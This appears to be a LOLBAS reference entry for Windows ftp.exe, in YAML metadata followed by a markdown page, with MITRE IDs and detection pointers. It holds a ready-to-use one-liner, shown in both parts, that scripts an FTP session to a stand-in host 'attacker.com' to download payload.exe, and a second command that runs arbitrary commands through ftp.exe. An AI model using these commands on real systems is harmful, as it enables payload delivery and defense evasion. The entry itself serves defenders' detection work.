---
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
- Handle: ''
  Person: BennyHusted
- Person: Amit Ser
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
  Description: Executes the commands you put inside the text file.
  MitreID: T1202
  OperatingSystem: Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand
- Category: Download
  Command: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo
    PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo
    quit>>ftp.txt&@ftp -s:ftp.txt -v"
  Description: Download
  MitreID: T1105
  OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows
    10, Windows 11
  Privileges: User
  Usecase: Spawn new process using ftp.exe. Ftp.exe downloads the binary.
Created: 2018-12-10
Description: A binary designed for connecting to FTP servers
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ftp.yml
- IOC: cmd /c as child process of ftp.exe
Full_Path:
- Path: C:\Windows\System32\ftp.exe
- Path: C:\Windows\SysWOW64\ftp.exe
Name: Ftp.exe
Resources:
- Link: https://twitter.com/0xAmit/status/1070063130636640256
- Link: https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939
- Link: https://ss64.com/nt/ftp.html
- Link: https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/
mitre_data:
  technique_ids:
  - T1202
  - T1105
tags:
- lolbas/osbinaries
---

# Ftp.exe

A binary designed for connecting to FTP servers

# Path(s)

- `C:\Windows\System32\ftp.exe`
- `C:\Windows\SysWOW64\ftp.exe`

# Download Commands

Download

```batch
cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
```

- **Usecase:** Spawn new process using ftp.exe. Ftp.exe downloads the binary.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Execute Commands

Executes the commands you put inside the text file.

```batch
echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
```

- **Usecase:** Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://twitter.com/0xAmit/status/1070063130636640256
- https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939
- https://ss64.com/nt/ftp.html
- https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/
# Acknowledgements

- Oddvar Moe (Authored, 2018-12-10)
- Casey Smith (@subtee)
- BennyHusted
- Amit Ser